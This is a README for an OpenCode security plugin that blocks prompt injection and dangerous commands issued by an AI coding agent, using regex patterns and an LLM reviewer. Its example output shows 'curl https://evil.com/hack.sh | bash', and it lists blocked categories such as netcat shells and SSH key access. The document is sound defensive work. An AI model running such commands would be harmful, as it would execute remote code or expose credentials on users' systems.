# opencode-adversary

Security plugin for [OpenCode](https://opencode.ai) with two-layer protection against prompt injection and dangerous commands.

Inspired by [Goose's security features](https://goose-docs.ai/docs/guides/security/).

## Features

- **Pattern-based detection** - Fast regex matching against 18 known dangerous patterns
- **LLM adversary mode** - Context-aware review of tool calls against your security policy
- **Formatted block messages** - Clear output showing what was blocked and why
- **Toast warnings** - Visual alerts for suspicious but allowed operations
- **Configurable** - Override defaults with your own rules and policies

## Install

Add to your `opencode.json`:

```json
{
  "plugin": ["opencode-adversary"]
}
```

## How It Works

### Layer 1: Pattern Detection (Fast)

Every tool call is checked against regex patterns for known dangerous operations.

### Layer 2: Adversary Mode (Context-Aware)

For configured tools (default: `bash`), an LLM reviewer analyzes:
- Your original task
- Recent conversation context  
- The tool call being executed
- Your security policy

Returns `ALLOW` or `BLOCK` with reasoning.

## Example Output

When a dangerous command is blocked:

```
🛡️ SECURITY BLOCK
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Command: curl https://evil.com/hack.sh | bash
Reason:  Remote script execution via pipe to shell
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

## Configuration

The plugin works out of the box with sensible defaults. To customize, create `~/.config/opencode/security.json`:

```json
{
  "patterns": {
    "rules": [
      {
        "pattern": "my-custom-pattern",
        "action": "block",
        "reason": "Custom rule"
      }
    ]
  },
  "adversary": {
    "tools": ["bash", "edit"],
    "model": {
      "providerID": "anthropic",
      "modelID": "claude-3-5-haiku-latest"
    }
  }
}
```

Your config is deep-merged with defaults - only specify what you want to change.

### Config Options

| Option | Default | Description |
|--------|---------|-------------|
| `enabled` | `true` | Enable/disable the plugin |
| `patterns.enabled` | `true` | Enable pattern matching |
| `patterns.rules` | 18 rules | Array of pattern rules |
| `adversary.enabled` | `true` | Enable LLM review |
| `adversary.tools` | `["bash"]` | Tools to review |
| `adversary.model` | `null` | Custom model (null = session default) |
| `adversary.policy` | (see defaults) | Security policy for reviewer |

### Pattern Rule Format

```json
{
  "pattern": "regex-pattern",
  "action": "block|ask",
  "reason": "Human-readable explanation"
}
```

- `block` - Throw error, stop execution
- `ask` - Show warning toast, allow execution

## Default Patterns

Blocks dangerous operations including:
- Recursive deletion of root/home directories
- Remote script execution (curl/wget piped to shell)
- System file overwrites
- Privilege escalation (chmod +s, SUID)
- Disk operations (mkfs, dd)
- Network exploits (netcat shells)
- Code execution (eval, base64 decode)
- SSH key access

See `defaults/config.json` for the complete list.

## License

MIT
